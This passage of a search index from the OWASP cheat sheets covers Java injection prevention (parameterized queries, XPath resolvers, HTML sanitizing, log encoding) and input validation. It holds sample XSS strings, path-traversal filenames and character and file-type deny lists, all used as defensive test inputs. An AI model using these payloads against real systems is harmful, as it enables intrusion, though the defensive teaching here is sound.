<appender-ref ref= \"RollingFile\" /> </root> </configuration> You also have to add the OWASP Security Logging dependency to your project. Usage of the logger at code level: import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; ... // No special action needed because security actions // are performed at the logging policy level Logger logger = LoggerFactory . getLogger ( MyClass . class ); logger . info ( logMessage ); ... References \u00b6 PatternLayout (See the encode{}{CRLF} function) Note that the default Log4j2 encode{} encoder is HTML, which does NOT prevent log injection. It prevents XSS attacks against viewing logs using a browser. OWASP recommends defending against XSS attacks in such situations in the log viewer application itself, not by preencoding all the log messages with HTML encoding as such log entries may be used/viewed in many other log viewing/analysis tools that don't expect the log data to be pre-HTML encoded. LOG4J Configuration LOG4J Appender Log Forging - See the Logback section about the CRLFConverter this library provides. Usage of OWASP Security Logging with Logback","title":"Injection Prevention in Java"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#injection-prevention-cheat-sheet-in-java","text":"","title":"Injection Prevention Cheat Sheet in Java"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#introduction","text":"This document has for objective to provide some tips to handle Injection into Java application code. Sample codes used in tips are located here .","title":"Introduction"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#what-is-injection","text":"Injection in OWASP Top 10 is defined as following: Consider anyone who can send untrusted data to the system, including external users, internal users, and administrators.","title":"What is Injection"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#general-advices-to-prevent-injection","text":"The following point can be applied, in a general way, to prevent Injection issue: Apply Input Validation (using whitelist approach) combined with Output Sanitizing+Escaping on user input/output. If you need to interact with system, try to use API features provided by your technology stack (Java / .Net / PHP...) instead of building command. Additional advices are provided on this cheatsheet .","title":"General advices to prevent Injection"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#specific-injection-types","text":"Examples in this section will be provided in Java technology (see Maven project associated) but advices are applicable to others technologies like .Net / PHP / Ruby / Python...","title":"Specific Injection types"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#sql","text":"","title":"SQL"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#symptom","text":"Injection of this type occur when the application use untrusted user input to build a SQL query using a String and execute it.","title":"Symptom"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#how-to-prevent","text":"Use Query Parameterization in order to prevent injection.","title":"How to prevent"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#example","text":"/*No DB framework used here in order to show the real use of Prepared Statement from Java API*/ /*Open connection with H2 database and use it*/ Class . forName ( \"org.h2.Driver\" ); String jdbcUrl = \"jdbc:h2:file:\" + new File ( \".\" ). getAbsolutePath () + \"/target/db\" ; try ( Connection con = DriverManager . getConnection ( jdbcUrl )) { /* Sample A: Select data using Prepared Statement*/ String query = \"select * from color where friendly_name = ?\" ; List < String > colors = new ArrayList <> (); try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , \"yellow\" ); try ( ResultSet rSet = pStatement . executeQuery ()) { while ( rSet . next ()) { colors . add ( rSet . getString ( 1 )); } } } Assert . assertEquals ( 1 , colors . size ()); Assert . assertTrue ( colors . contains ( \"yellow\" )); /* Sample B: Insert data using Prepared Statement*/ query = \"insert into color(friendly_name, red, green, blue) values(?, ?, ?, ?)\" ; int insertedRecordCount ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , \"orange\" ); pStatement . setInt ( 2 , 239 ); pStatement . setInt ( 3 , 125 ); pStatement . setInt ( 4 , 11 ); insertedRecordCount = pStatement . executeUpdate (); } Assert . assertEquals ( 1 , insertedRecordCount ); /* Sample C: Update data using Prepared Statement*/ query = \"update color set blue = ? where friendly_name = ?\" ; int updatedRecordCount ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setInt ( 1 , 10 ); pStatement . setString ( 2 , \"orange\" ); updatedRecordCount = pStatement . executeUpdate (); } Assert . assertEquals ( 1 , updatedRecordCount ); /* Sample D: Delete data using Prepared Statement*/ query = \"delete from color where friendly_name = ?\" ; int deletedRecordCount ; try ( PreparedStatement pStatement = con . prepareStatement ( query )) { pStatement . setString ( 1 , \"orange\" ); deletedRecordCount = pStatement . executeUpdate (); } Assert . assertEquals ( 1 , deletedRecordCount ); }","title":"Example"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#references","text":"SQL Injection Prevention Cheat Sheet","title":"References"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#jpa","text":"","title":"JPA"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#symptom_1","text":"Injection of this type occur when the application use untrusted user input to build a JPA query using a String and execute it. It's quite similar to SQL injection but here the altered language is not SQL but JPA QL.","title":"Symptom"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#how-to-prevent_1","text":"Use Java Persistence Query Language Query Parameterization in order to prevent injection.","title":"How to prevent"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#example_1","text":"EntityManager entityManager = null ; try { /* Get a ref on EntityManager to access DB */ entityManager = Persistence . createEntityManagerFactory ( \"testJPA\" ). createEntityManager (); /* Define parameterized query prototype using named parameter to enhance readability */ String queryPrototype = \"select c from Color c where c.friendlyName = :colorName\" ; /* Create the query, set the named parameter and execute the query */ Query queryObject = entityManager . createQuery ( queryPrototype ); Color c = ( Color ) queryObject . setParameter ( \"colorName\" , \"yellow\" ). getSingleResult (); /* Ensure that the object obtained is the right one */ Assert . assertNotNull ( c ); Assert . assertEquals ( c . getFriendlyName (), \"yellow\" ); Assert . assertEquals ( c . getRed (), 213 ); Assert . assertEquals ( c . getGreen (), 242 ); Assert . assertEquals ( c . getBlue (), 26 ); } finally { if ( entityManager != null && entityManager . isOpen ()) { entityManager . close (); } }","title":"Example"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#references_1","text":"SQLi and JPA","title":"References"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#operating-system","text":"","title":"Operating System"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#symptom_2","text":"Injection of this type occur when the application use untrusted user input to build a Operating System command using a String and execute it.","title":"Symptom"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#how-to-prevent_2","text":"Use technology stack API in order to prevent injection.","title":"How to prevent"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#example_2","text":"/* The context taken is, for example, to perform a PING against a computer. * The prevention is to use the feature provided by the Java API instead of building * a system command as String and execute it */ InetAddress host = InetAddress . getByName ( \"localhost\" ); Assert . assertTrue ( host . isReachable ( 5000 ));","title":"Example"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#references_2","text":"Command Injection","title":"References"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#xml-xpath-injection","text":"","title":"XML: XPath Injection"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#symptom_3","text":"Injection of this type occur when the application use untrusted user input to build a XPath query using a String and execute it.","title":"Symptom"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#how-to-prevent_3","text":"Use XPath Variable Resolver in order to prevent injection.","title":"How to prevent"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#example_3","text":"Variable Resolver implementation. /** * Resolver in order to define parameter for XPATH expression. * */ public class SimpleVariableResolver implements XPathVariableResolver { private final Map < QName , Object > vars = new HashMap < QName , Object > (); /** * External methods to add parameter * * @param name Parameter name * @param value Parameter value */ public void addVariable ( QName name , Object value ) { vars . put ( name , value ); } /** * {@inheritDoc} * * @see javax.xml.xpath.XPathVariableResolver#resolveVariable(javax.xml.namespace.QName) */ public Object resolveVariable ( QName variableName ) { return vars . get ( variableName ); } } Code using it to perform XPath query. /*Create a XML document builder factory*/ DocumentBuilderFactory dbf = DocumentBuilderFactory . newInstance (); /*Disable External Entity resolution for differents cases*/ //Do not performed here in order to focus on variable resolver code //but do it for production code ! /*Load XML file*/ DocumentBuilder builder = dbf . newDocumentBuilder (); Document doc = builder . parse ( new File ( \"src/test/resources/SampleXPath.xml\" )); /* Create and configure parameter resolver */ String bid = \"bk102\" ; SimpleVariableResolver variableResolver = new SimpleVariableResolver (); variableResolver . addVariable ( new QName ( \"bookId\" ), bid ); /*Create and configure XPATH expression*/ XPath xpath = XPathFactory . newInstance (). newXPath (); xpath . setXPathVariableResolver ( variableResolver ); XPathExpression xPathExpression = xpath . compile ( \"//book[@id=$bookId]\" ); /* Apply expression on XML document */ Object nodes = xPathExpression . evaluate ( doc , XPathConstants . NODESET ); NodeList nodesList = ( NodeList ) nodes ; Assert . assertNotNull ( nodesList ); Assert . assertEquals ( 1 , nodesList . getLength ()); Element book = ( Element ) nodesList . item ( 0 ); Assert . assertTrue ( book . getTextContent (). contains ( \"Ralls, Kim\" ));","title":"Example"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#references_3","text":"XPATH Injection","title":"References"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#htmljavascriptcss","text":"","title":"HTML/JavaScript/CSS"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#symptom_4","text":"Injection of this type occur when the application use untrusted user input to build a HTTP response and sent it to browser.","title":"Symptom"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#how-to-prevent_4","text":"Either apply strict input validation (whitelist approach) or use output sanitizing+escaping if input validation is not possible (combine both every time is possible).","title":"How to prevent"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#example_4","text":"/* INPUT WAY: Receive data from user Here it's recommended to use strict input validation using whitelist approach. In fact, you ensure that only allowed characters are part of the input received. */ String userInput = \"You user login is owasp-user01\" ; /* First we check that the value contains only expected character*/ Assert . assertTrue ( Pattern . matches ( \"[a-zA-Z0-9\\\\s\\\\-]{1,50}\" , userInput )); /* If the first check pass then ensure that potential dangerous character that we have allowed for business requirement are not used in a dangerous way. For example here we have allowed the character '-', and, this can be used in SQL injection so, we ensure that this character is not used is a continuous form. Use the API COMMONS LANG v3 to help in String analysis... */ Assert . assertEquals ( 0 , StringUtils . countMatches ( userInput . replace ( \" \" , \"\" ), \"--\" )); /* OUTPUT WAY: Send data to user Here we escape + sanitize any data sent to user Use the OWASP Java HTML Sanitizer API to handle sanitizing Use the OWASP Java Encoder API to handle HTML tag encoding (escaping) */ String outputToUser = \"You <p>user login</p> is <strong>owasp-user01</strong>\" ; outputToUser += \"<script>alert(22);</script><img src='#' onload='javascript:alert(23);'>\" ; /* Create a sanitizing policy that only allow tag '<p>' and '<strong>'*/ PolicyFactory policy = new HtmlPolicyBuilder (). allowElements ( \"p\" , \"strong\" ). toFactory (); /* Sanitize the output that will be sent to user*/ String safeOutput = policy . sanitize ( outputToUser ); /* Encode HTML Tag*/ safeOutput = Encode . forHtml ( safeOutput ); String finalSafeOutputExpected = \"You <p>user login</p> is <strong>owasp-user01</strong>\" ; Assert . assertEquals ( finalSafeOutputExpected , safeOutput );","title":"Example"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#references_4","text":"XSS OWASP Java HTML Sanitizer OWASP Java Encoder Java RegEx","title":"References"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#ldap","text":"A dedicated cheatsheet has been created.","title":"LDAP"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#nosql","text":"","title":"NoSQL"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#symptom_5","text":"Injection of this type occur when the application use untrusted user input to build a NoSQL API call expression.","title":"Symptom"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#how-to-prevent_5","text":"As there many NoSQL database system and each one use a API for call, it's important to ensure that user input received and used to build the API call expression do not contains any character that have a special meaning in the target API syntax. This in order to avoid that it will be used to escape the initial call expression in order to create another one based on crafted user input. It's also important to not use string concatenation to build API call expression but use the API to create the expression.","title":"How to prevent"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#example-mongodb","text":"/* Here use MongoDB as target NoSQL DB */ String userInput = \"Brooklyn\" ; /* First ensure that the input do no contains any special characters for the current NoSQL DB call API, here they are: ' \" \\ ; { } $ */ //Avoid regexp this time in order to made validation code //more easy to read and understand... ArrayList < String > specialCharsList = new ArrayList < String > () { { add ( \"'\" ); add ( \"\\\"\" ); add ( \"\\\\\" ); add ( \";\" ); add ( \"{\" ); add ( \"}\" ); add ( \"$\" ); } }; specialCharsList . forEach ( specChar -> Assert . assertFalse ( userInput . contains ( specChar ))); //Add also a check on input max size Assert . assertTrue ( userInput . length () <= 50 ); /* Then perform query on database using API to build expression */ //Connect to the local MongoDB instance try ( MongoClient mongoClient = new MongoClient ()){ MongoDatabase db = mongoClient . getDatabase ( \"test\" ); //Use API query builder to create call expression //Create expression Bson expression = eq ( \"borough\" , userInput ); //Perform call FindIterable < org . bson . Document > restaurants = db . getCollection ( \"restaurants\" ). find ( expression ); //Verify result consistency restaurants . forEach ( new Block < org . bson . Document > () { @Override public void apply ( final org . bson . Document doc ) { String restBorough = ( String ) doc . get ( \"borough\" ); Assert . assertTrue ( \"Brooklyn\" . equals ( restBorough )); } }); }","title":"Example - MongoDB"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#references_5","text":"Testing for NoSQL injection SQL and NoSQL Injection No SQL, No Injection?","title":"References"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#log-injection","text":"","title":"Log Injection"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#symptom_6","text":"Log Injection occurs when an application includes untrusted data in an application log message (e.g., an attacker can cause an additional log entry that looks like it came from a completely different user, if they can inject CRLF characters in the untrusted data). More information about this attack is available on the OWASP Log Injection page.","title":"Symptom"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#how-to-prevent_6","text":"To prevent an attacker from writing malicious content into the application log, apply defenses such as: Filter the user input used to prevent injection of C arriage R eturn (CR) or L ine F eed (LF) characters. Limit the size of the user input value used to create the log message. Make sure all XSS defenses are applied when viewing log files in a web browser.","title":"How to prevent"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#example-using-log4j2","text":"Configuration of a logging policy to roll on 10 files of 5MB each, and encode/limit the log message using the Pattern encode{}{CRLF} , introduced in Log4j2 v2.10.0 , and the -500m message size limit.: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <Configuration status= \"error\" name= \"SecureLoggingPolicy\" > <Appenders> <RollingFile name= \"RollingFile\" fileName= \"App.log\" filePattern= \"App-%i.log\" ignoreExceptions= \"false\" > <PatternLayout> <!-- Encode any CRLF chars in the message and limit its maximum size to 500 characters --> <Pattern> %d{ISO8601} %-5p - %encode{ %.-500m }{CRLF}%n </Pattern> </PatternLayout> <Policies> <SizeBasedTriggeringPolicy size= \"5MB\" /> </Policies> <DefaultRolloverStrategy max= \"10\" /> </RollingFile> </Appenders> <Loggers> <Root level= \"debug\" > <AppenderRef ref= \"RollingFile\" /> </Root> </Loggers> </Configuration> Usage of the logger at code level: import org.apache.logging.log4j.LogManager ; import org.apache.logging.log4j.Logger ; ... // No special action needed because security actions are // performed at the logging policy level Logger logger = LogManager . getLogger ( MyClass . class ); logger . info ( logMessage ); ...","title":"Example using Log4j2"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#example-using-logback-with-the-owasp-security-logging-library","text":"Configuration of a logging policy to roll on 10 files of 5MB each, and encode/limit the log message using the CRLFConverter , provided by the OWASP Security Logging Project , and the -500msg message size limit: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <configuration> <!-- Define the CRLFConverter --> <conversionRule conversionWord= \"crlf\" converterClass= \"org.owasp.security.logging.mask.CRLFConverter\" /> <appender name= \"RollingFile\" class= \"ch.qos.logback.core.rolling.RollingFileAppender\" > <file> App.log </file> <rollingPolicy class= \"ch.qos.logback.core.rolling.FixedWindowRollingPolicy\" > <fileNamePattern> App-%i.log </fileNamePattern> <minIndex> 1 </minIndex> <maxIndex> 10 </maxIndex> </rollingPolicy> <triggeringPolicy class= \"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy\" > <maxFileSize> 5MB </maxFileSize> </triggeringPolicy> <encoder> <!-- Encode any CRLF chars in the message and limit its maximum size to 500 characters --> <pattern> %relative [%thread] %-5level %logger{35} - %crlf(%.-500msg) %n </pattern> </encoder> </appender> <root level= \"debug\" > <appender-ref ref= \"RollingFile\" /> </root> </configuration> You also have to add the OWASP Security Logging dependency to your project. Usage of the logger at code level: import org.slf4j.Logger ; import org.slf4j.LoggerFactory ; ... // No special action needed because security actions // are performed at the logging policy level Logger logger = LoggerFactory . getLogger ( MyClass . class ); logger . info ( logMessage ); ...","title":"Example using Logback with the OWASP Security Logging library"},{"location":"cheatsheets/Injection_Prevention_in_Java_Cheat_Sheet.html#references_6","text":"PatternLayout (See the encode{}{CRLF} function) Note that the default Log4j2 encode{} encoder is HTML, which does NOT prevent log injection. It prevents XSS attacks against viewing logs using a browser. OWASP recommends defending against XSS attacks in such situations in the log viewer application itself, not by preencoding all the log messages with HTML encoding as such log entries may be used/viewed in many other log viewing/analysis tools that don't expect the log data to be pre-HTML encoded. LOG4J Configuration LOG4J Appender Log Forging - See the Logback section about the CRLFConverter this library provides. Usage of OWASP Security Logging with Logback","title":"References"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html","text":"Input Validation Cheat Sheet \u00b6 Introduction \u00b6 This article is focused on providing clear, simple, actionable guidance for providing Input Validation security functionality in your applications. Goals of Input Validation \u00b6 Input validation is performed to ensure only properly formed data is entering the workflow in an information system, preventing malformed data from persisting in the database and triggering malfunction of various downstream components. Input validation should happen as early as possible in the data flow, preferably as soon as the data is received from the external party. Data from all potentially untrusted sources should be subject to input validation, including not only Internet-facing web clients but also backend feeds over extranets, from suppliers, partners, vendors or regulators , each of which may be compromised on their own and start sending malformed data. Input Validation should not be used as the primary method of preventing XSS , SQL Injection and other attacks which are covered in respective cheat sheets but can significantly contribute to reducing their impact if implemented properly. Input validation strategies \u00b6 Input validation should be applied on both syntactical and Semantic level. Syntactic validation should enforce correct syntax of structured fields (e.g. SSN, date, currency symbol). Semantic validation should enforce correctness of their values in the specific business context (e.g. start date is before end date, price is within expected range). It is always recommended to prevent attacks as early as possible in the processing of the user's (attacker's) request. Input validation can be used to detect unauthorized input before it is processed by the application. Implementing input validation \u00b6 Input validation can be implemented using any programming technique that allows effective enforcement of syntactic and semantic correctness, for example: Data type validators available natively in web application frameworks (such as Django Validators , Apache Commons Validators etc). Validation against JSON Schema and XML Schema (XSD) for input in these formats. Type conversion (e.g. Integer.parseInt() in Java, int() in Python) with strict exception handling Minimum and maximum value range check for numerical parameters and dates, minimum and maximum length check for strings. Array of allowed values for small sets of string parameters (e.g. days of week). Regular expressions for any other structured data covering the whole input string (^...$) and not using \"any character\" wildcard (such as . or \\S ) Whitelisting vs blacklisting \u00b6 It is a common mistake to use black list validation in order to try to detect possibly dangerous characters and patterns like the apostrophe ' character, the string 1=1 , or the <script> tag, but this is a massively flawed approach as it is trivial for an attacker to bypass such filters. Plus, such filters frequently prevent authorized input, like O'Brian , where the ' character is fully legitimate. For more information on XSS filter evasion please see the this wiki page . White list validation is appropriate for all input fields provided by the user. White list validation involves defining exactly what IS authorized, and by definition, everything else is not authorized. If it's well structured data, like dates, social security numbers, zip codes, email addresses, etc. then the developer should be able to define a very strong validation pattern, usually based on regular expressions, for validating such input. If the input field comes from a fixed set of options, like a drop down list or radio buttons, then the input needs to match exactly one of the values offered to the user in the first place. Validating free-form Unicode text \u00b6 Free-form text, especially with Unicode characters, is perceived as difficult to validate due to a relatively large space of characters that need to be whitelisted. It's also free-form text input that highlights the importance of proper context-aware output encoding and quite clearly demonstrates that input validation is not the primary safeguards against Cross-Site Scripting. If your users want to type apostrophe ' or less-than sign < in their comment field, they might have perfectly legitimate reason for that and the application's job is to properly handle it throughout the whole life cycle of the data. The primary means of input validation for free-form text input should be: Normalization: Ensure canonical encoding is used across all the text and no invalid characters are present. Character category whitelisting: Unicode allows whitelisting categories such as \"decimal digits\" or \"letters\" which not only covers the Latin alphabet but also various other scripts used globally (e.g. Arabic, Cyrillic, CJK ideographs etc). Individual character whitelisting: If you allow letters and ideographs in names and also want to allow apostrophe ' for Irish names, but don't want to allow the whole punctuation category. References: Input validation of free-form Unicode text in Python Regular expressions \u00b6 Developing regular expressions can be complicated, and is well beyond the scope of this cheat sheet. There are lots of resources on the internet about how to write regular expressions, including this site and the OWASP Validation Regex Repository . In summary, input validation should: Be applied to all input data, at minimum. Define the allowed set of characters to be accepted. Define a minimum and maximum length for the data (e.g. {1,25} ). White List Regular Expression Examples \u00b6 Validating a U.S. Zip Code (5 digits plus optional -4) ^\\d{5}(-\\d{4})?$ Validating U.S. State Selection From a Drop-Down Menu ^(AA|AE|AP|AL|AK|AS|AZ|AR|CA|CO|CT|DE|DC|FM|FL|GA|GU| HI|ID|IL|IN|IA|KS|KY|LA|ME|MH|MD|MA|MI|MN|MS|MO|MT|NE| NV|NH|NJ|NM|NY|NC|ND|MP|OH|OK|OR|PW|PA|PR|RI|SC|SD|TN| TX|UT|VT|VI|VA|WA|WV|WI|WY)$ Java Regex Usage Example: Example validating the parameter \"zip\" using a regular expression. private static final Pattern zipPattern = Pattern . compile ( \"^\\d{5}(-\\d{4})?$\" ); public void doPost ( HttpServletRequest request , HttpServletResponse response ) { try { String zipCode = request . getParameter ( \"zip\" ); if ( ! zipPattern . matcher ( zipCode ). matches () { throw new YourValidationException ( \"Improper zipcode format.\" ); } // do what you want here, after its been validated .. } catch ( YourValidationException e ) { response . sendError ( response . SC_BAD_REQUEST , e . getMessage () ); } } Some white list validators have also been predefined in various open source packages that you can leverage. For example: Apache Commons Validator Client Side vs Server Side Validation \u00b6 Be aware that any JavaScript input validation performed on the client can be bypassed by an attacker that disables JavaScript or uses a Web Proxy. Ensure that any input validation performed on the client is also performed on the server. Validating Rich User Content \u00b6 It is very difficult to validate rich content submitted by a user. For more information, please see the XSS cheatsheet on Sanitizing HTML Markup with a Library Designed for the Job . Preventing XSS and Content Security Policy \u00b6 All user data controlled must be encoded when returned in the HTML page to prevent the execution of malicious data (e.g. XSS). For example <script> would be returned as &lt;script&gt; The type of encoding is specific to the context of the page where the user controlled data is inserted. For example, HTML entity encoding is appropriate for data placed into the HTML body. However, user data placed into a script would need JavaScript specific output encoding. Detailed information on XSS prevention here: OWASP XSS Prevention Cheat Sheet File Upload Validation \u00b6 Many websites allow users to upload files, such as a profile picture or more. This section helps provide that feature securely. Check the File Upload Cheat Sheet . Upload Verification \u00b6 Use input validation to ensure the uploaded filename uses an expected extension type. Ensure the uploaded file is not larger than a defined maximum file size. If the website supports ZIP file upload, do validation check before unzip the file. The check includes the target path, level of compress, estimated unzip size. Upload Storage \u00b6 Use a new filename to store the file on the OS. Do not use any user controlled text for this filename or for the temporary filename. When the file is uploaded to web, it's suggested to rename the file on storage. For example, the uploaded filename is test.JPG , rename it to JAI1287uaisdjhf.JPG with a random filename. The purpose of doing it to prevent the risks of direct file access and ambiguous filename to evalide the filter, such as test.jpg;.asp or /../../../../../test.jpg . Uploaded files should be analyzed for malicious content (anti-malware, static analysis, etc). The file path should not be able to specify by client side. It's decided by server side. Public Serving of Uploaded Content \u00b6 Ensure uploaded images are served with the correct content-type (e.g. image/jpeg, application/x-xpinstall) Beware of \"special\" files \u00b6 The upload feature should be using a whitelist approach to only allow specific file types and extensions. However, it is important to be aware of the following file types that, if allowed, could result in security vulnerabilities: crossdomain.xml / clientaccesspolicy.xml: allows cross-domain data loading in Flash, Java and Silverlight. If permitted on sites with authentication this can permit cross-domain data theft and CSRF attacks. Note this can get pretty complicated depending on the specific plugin version in question, so its best to just prohibit files named \"crossdomain.xml\" or \"clientaccesspolicy.xml\". .htaccess and .htpasswd: Provides server configuration options on a per-directory basis, and should not be permitted. See HTACCESS documentation . Web executable script files are suggested not to be allowed such as aspx, asp, css, swf, xhtml, rhtml, shtml, jsp, js, pl, php, cgi . Image Upload Verification \u00b6 Use image rewriting libraries to verify the image is valid and to strip away extraneous content. Set the extension of the stored image to be a valid image extension based on the detected content type of the image from image processing (e.g. do not just trust the header from the upload). Ensure the detected content type of the image is within a list of defined image types (jpg, png, etc) Email Address Validation \u00b6 Syntactic Validation \u00b6 The format of email addresses is defined by RFC 5321 , and is far more complicated than most people realise. As an example, the following are all considered to be valid email addresses: \"><script>alert(1);</script>\"@example.org user+subaddress@example.org user@[IPv6:2001:db8::1] \" \"@example.org Properly parsing email addresses for validity with regular expressions is very complicated, although there are a number of publicly available documents on regex . The biggest caveat on this is that although the RFC defines a very flexible format for email addresses, most real world implementations (such as mail servers) use a far more restricted address format, meaning that they will reject addresses that are technically valid. Although they may be technically correct, these addresses are of little use if your application will not be able to actually send emails to them. As such, the best way to validate email addresses is to perform some basic initial validation, and then pass the address to the mail server and catch the exception if it rejects it. This means that any the application can be confident that its mail server can send emails to any addresses it accepts. The initial validation could be as simple as: The email address contains two parts, separated with an @ symbol. The email address does not contain dangerous characters (such as backticks, single or double quotes, or null bytes). Exactly which characters are dangerous will depend on how the address is going to be used (echoed in page, inserted into database, etc). The domain part contains only letters, numbers, hyphens ( - ) and periods ( . ). The email address is a reasonable length: The local part (before the @ ) should be no more than 63 characters. The total length should be no more than 254 characters. Semantic Validation \u00b6 Semantic validation is about determining whether the email address is correct and legitimate. The most common way to do this is to send an email to the user, and require that they click a link in the email, or enter a code that has been sent to them. This provides a basic level of assurance that: The email address is correct. The application can successfully send emails to it. The user has access to the mailbox. The links that are sent to users to prove ownership should contain a token that is: At least 32 characters long. Generated using a secure source of randomness . Single use. Time limited (e.g, expiring after eight hours). After validating the ownership of the email address, the user should then be required to authenticate on the application through the usual mechanism. Disposable Email Addresses \u00b6 In some cases, users may not want to give their real email address when registering on the application, and will instead provide a disposable email address. These are publicly available addresses that do not require the user to authenticate, and are typically used to reduce the amount of spam received by users' primary email addresses. Blocking disposable email addresses is almost impossible, as there are a large number of websites offering these services, with new domains being created every day. There are a number of publicly available lists and commercial lists of known disposable domains, but these will always be incomplete. If these lists are used to block the use of disposable email addresses then the user should be presented with a message explaining why they are blocked (although they are likely to simply search for another disposable provider rather than giving their legitimate address). If it is essential that disposable email addresses are blocked, then registrations should only be allowed from specifically whitelisted email providers. However, if this includes public providers such as Google or Yahoo, users can simply register their own disposable address with them. Sub-Addressing \u00b6 Sub-addressing allows a user to specify a tag in the local part of the email address (before the @ sign), which will be ignored by the mail server. For example, if that example.org domain supports sub-addressing, then the following email addresses are equivalent: user@example.org user+site1@example.org user+site2@example.org Many mail providers (such as Microsoft Exchange) do not support sub-addressing. The most notable provider who does is Gmail, although there are many others that also do. Some users will use a different tag for each website they register on, so that if they start receiving spam to one of the sub-addresses they can identify which website leaked or sold their email address. Because it could allow users to register multiple accounts with a single email address, some sites may wish to block sub-addressing by stripping out everything between the + and @ signs. This is not generally recommended, as it suggests that the website owner is either unaware of sub-addressing or wishes to prevent users from identifying them when they leak or sell email addresses. Additionally, it can be trivially bypassed by using disposable email addresses , or simply registering multiple email accounts with a trusted provider.","title":"Input Validation"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#input-validation-cheat-sheet","text":"","title":"Input Validation Cheat Sheet"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#introduction","text":"This article is focused on providing clear, simple, actionable guidance for providing Input Validation security functionality in your applications.","title":"Introduction"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#goals-of-input-validation","text":"Input validation is performed to ensure only properly formed data is entering the workflow in an information system, preventing malformed data from persisting in the database and triggering malfunction of various downstream components. Input validation should happen as early as possible in the data flow, preferably as soon as the data is received from the external party. Data from all potentially untrusted sources should be subject to input validation, including not only Internet-facing web clients but also backend feeds over extranets, from suppliers, partners, vendors or regulators , each of which may be compromised on their own and start sending malformed data. Input Validation should not be used as the primary method of preventing XSS , SQL Injection and other attacks which are covered in respective cheat sheets but can significantly contribute to reducing their impact if implemented properly.","title":"Goals of Input Validation"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#input-validation-strategies","text":"Input validation should be applied on both syntactical and Semantic level. Syntactic validation should enforce correct syntax of structured fields (e.g. SSN, date, currency symbol). Semantic validation should enforce correctness of their values in the specific business context (e.g. start date is before end date, price is within expected range). It is always recommended to prevent attacks as early as possible in the processing of the user's (attacker's) request. Input validation can be used to detect unauthorized input before it is processed by the application.","title":"Input validation strategies"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#implementing-input-validation","text":"Input validation can be implemented using any programming technique that allows effective enforcement of syntactic and semantic correctness, for example: Data type validators available natively in web application frameworks (such as Django Validators , Apache Commons Validators etc). Validation against JSON Schema and XML Schema (XSD) for input in these formats. Type conversion (e.g. Integer.parseInt() in Java, int() in Python) with strict exception handling Minimum and maximum value range check for numerical parameters and dates, minimum and maximum length check for strings. Array of allowed values for small sets of string parameters (e.g. days of week). Regular expressions for any other structured data covering the whole input string (^...$) and not using \"any character\" wildcard (such as . or \\S )","title":"Implementing input validation"},{"location":"cheatsheets/Input_Validation_Cheat_Sheet.html#whitelisting-vs-blacklisting","text":"It is a common mistake to use black list validation in order to try to detect possibly dangerous characters and patterns like the apostrophe ' character, the string 1=1 , or the <script> tag, but this is a massively flawed approach as it is trivial for an attacker to bypass such filters. Plus, such filters frequently prevent authorized input, like O'Brian , where the ' character is 